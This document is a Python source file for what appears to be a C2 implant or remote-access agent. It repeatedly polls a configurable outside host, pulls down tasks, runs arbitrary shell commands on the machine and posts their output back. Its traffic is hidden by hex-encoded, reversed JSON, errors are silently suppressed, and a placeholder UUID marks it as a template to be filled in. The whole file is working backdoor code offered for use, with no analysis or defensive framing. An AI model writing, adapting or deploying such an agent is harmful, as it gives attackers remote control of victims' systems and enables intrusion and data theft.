import http.client
import asyncio
import json
import time

class C(object):
    def __init__(self, host: str, secure: bool = False, interval: int = 3):
        self.running = True
        self.host = host
        self.secure = secure
        self.interval = interval
        self.uuid = 'REPLACEUUID'
        self.results = {}
        self.tasks = {}
        self.lock = asyncio.Lock()
        asyncio.run(self.start())
    
    async def stop(self):
        self.running = False
        return {}

    async def shell(self, task):
        proc = await asyncio.create_subprocess_shell(
            task['cmd'], stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        result = {}
        stdout, stderr = await proc.communicate()
        result['stdout'] = stdout.decode()
        result['stderr'] = stderr.decode()
        result['completed'] = time.time()
        result['returncode'] = proc.returncode
        return result

    def decode(self, data: bytes):
        return json.loads(bytes.fromhex(data[::-1].decode()))

    def encode(self, data) -> bytes :
        return json.dumps(data).encode().hex()[::-1]

    def newConn(self):
        if self.secure:
            conn = http.client.HTTPSConnection(self.host)
        else:
            conn = http.client.HTTPConnection(self.host)
        return conn
    
    async def handleTask(self, taskId, task):
        if task['action'] == 'stop':
            result = await self.stop()
        elif task['action'] == 'shell':
            result = await self.shell(task)
        else:
            return

        async with self.lock:
            self.results[taskId] = result
        
    async def sync(self):
        conn = self.newConn()
        body = {}
        async with self.lock:
            results = self.results.copy()
        if results:
            body['results'] = results
        
        if body:
            encodedbody = self.encode(body)
        else:
            encodedbody = None

        conn.request("POST", f'/{self.uuid}', headers={"Host": self.host}, body=encodedbody)
        resp = conn.getresponse()
        data = resp.read()
        conn.close()

        if resp.status != 200:
            return
        
        # Clear results
        if results:
            async with self.lock:
                for taskId in body['results'].keys():
                    del self.results[taskId]
        
        data = self.decode(data)
        for taskId, task in data['tasks'].items():
            async with self.lock:
                self.tasks[taskId] = asyncio.create_task(self.handleTask(taskId, task))
    
    async def start(self):
        while self.running:
            await asyncio.sleep(self.interval)
            try:
                await self.sync()
                await asyncio.sleep(0.1)
            except:
                pass
            
        # Exit
        await asyncio.sleep(1)
        await self.sync()
        async with self.lock:
            for taskId, task in self.tasks.items():
                task.cancel()